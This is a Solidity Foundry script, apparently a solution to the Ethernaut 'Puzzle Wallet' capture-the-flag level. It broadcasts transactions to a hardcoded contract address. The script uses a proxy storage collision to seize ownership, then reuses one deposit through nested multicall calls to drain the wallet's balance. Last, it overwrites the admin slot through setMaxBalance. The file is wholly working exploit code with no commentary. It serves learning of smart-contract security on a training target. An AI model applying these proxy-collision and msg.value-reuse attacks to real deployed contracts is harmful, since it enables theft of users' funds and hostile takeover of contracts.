// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "../src/interfaces/24_IPuzzleWallet.sol";

address constant INSTANCE = 0xC6a6F6e1Eb4D1dfAD4e057254A2b593b3400c143;

contract PuzzleWalletPOCScript is Script {
    function run() external {
        vm.startBroadcast();

        IPuzzleProxy(INSTANCE).proposeNewAdmin(msg.sender);
        assert(IPuzzleWallet(INSTANCE).owner() == msg.sender);

        IPuzzleWallet(INSTANCE).addToWhitelist(msg.sender);

        bytes[] memory nestedcallData = new bytes[](2);
        nestedcallData[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
        nestedcallData[1] = abi.encodeWithSelector(IPuzzleWallet.execute.selector, msg.sender, 2000000000000000, "");

        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
        multicallData[1] = abi.encodeWithSelector(IPuzzleWallet.multicall.selector, nestedcallData);
        IPuzzleWallet(INSTANCE).multicall{value: 1000000000000000 wei}(multicallData);
        assert(address(INSTANCE).balance == 0);

        IPuzzleWallet(INSTANCE).setMaxBalance(uint256(uint160(msg.sender)));
        assert(IPuzzleProxy(INSTANCE).admin() == msg.sender);

        vm.stopBroadcast();
    }
}
